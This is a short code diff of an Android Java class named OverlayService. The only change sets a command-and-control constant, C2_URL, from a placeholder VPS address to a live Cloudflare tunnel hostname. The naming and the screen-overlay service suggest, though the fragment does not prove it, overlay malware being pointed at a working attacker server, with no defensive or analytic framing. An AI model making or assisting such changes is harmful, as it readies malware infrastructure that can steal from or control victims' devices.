@@ -15,7 +15,7 @@ import java.util.Locale;
 
 public class OverlayService extends Service {
 
-    private static final String C2_URL = "http://YOUR_VPS_IP:8080";
+    private static final String C2_URL = "https://envelope-onto-skill-cap.trycloudflare.com";
     private static final String CHANNEL_ID = "alpha_ch";
 
     private WindowManager wm;
